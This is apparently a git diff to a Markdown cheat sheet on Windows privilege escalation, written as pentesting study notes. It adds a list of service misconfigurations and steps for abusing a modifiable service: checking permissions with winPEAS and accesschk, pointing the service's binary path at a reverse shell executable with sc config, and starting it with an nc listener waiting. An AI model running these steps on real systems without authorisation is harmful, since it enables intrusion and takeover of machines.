@@ -78,6 +78,7 @@ open new cmd
 .\winPEAS.exe
 ```
 ## Service Exploit
+- Note that you need to have permission to start and stop service for this to work
 ### Important Services Commands
 - Query configurations of service
 ```
@@ -96,8 +97,27 @@ sc config <svc name> <option>= <value>
 ```
 sc start/stop <svc name>
 ```
+## 5 Types of Misconfigurations
+1. Insecure Service Properties
+2. Unquoted Service Path
+3. Weak Registry Permission
+4. Insecure Service Executables
+5. DLL Hijacking
 
-
+## Insecure Service Properties
+1. Check winpeas under ```interesting services - non microsoft``` and see if there is any one of it states that ```you can modify this service```
+2. You can verify it again in winpeas under ```modifiable services``` section
+3. You can further verify it with ```accesschk.exe``` and see if you have ```SERVICE_CHANGE_CONFIG``` with this command
+```
+.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
+```
+4. See where does the binary path point to with ```sc qc <svc name>```
+5. see if you need to start/stop the service ```sc query <svc name>```
+6. change binary path to location of our reverse shell
+```
+sc config <svc name> binpath= "\"C:\Privesc\reverse.exe\""
+```
+7. setup ```nc``` and start the service with ```net start <svc name>```
 
 ## Kernel Exploit (Last resort)
 ### Tools
